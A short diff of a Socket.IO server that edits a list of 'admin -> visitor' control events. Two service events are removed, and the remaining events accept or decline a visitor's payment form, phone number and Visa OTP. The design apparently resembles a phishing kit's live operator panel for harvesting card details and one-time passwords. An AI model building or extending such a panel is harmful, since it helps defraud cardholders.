@@ -953,10 +953,9 @@ io.on("connection", (socket) => {
 
   // admin -> visitor control events (tmn contract)
   const adminControlEvents = [
-    "acceptService",
-    "declineService",
     "acceptPaymentForm",
     "declinePaymentForm",
+
     "acceptPhone",
     "declinePhone",
     "acceptVisaOtp",
